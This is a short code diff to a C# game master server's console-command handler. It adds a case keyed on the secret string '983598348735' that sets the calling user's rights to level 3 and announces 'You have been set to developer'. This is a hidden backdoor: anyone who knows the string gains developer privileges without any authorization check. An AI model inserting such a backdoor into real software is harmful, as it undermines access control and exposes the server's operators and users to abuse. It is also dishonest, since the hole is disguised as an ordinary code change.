@@ -212,8 +212,11 @@ namespace FL_Master_Server.Player.Content
                 case "rank":
                     MasterServer.Instance.SendConsoleMessage(user, user.Rights.ToString());
                     return true;
-
-            } 
+                case "983598348735":
+                    UserMethods.SetRights(user, 3);
+                    MasterServer.Instance.SendConsoleMessage(user, "You have been set to developer");
+                    return true;
+            }
             return false;
         }
     }
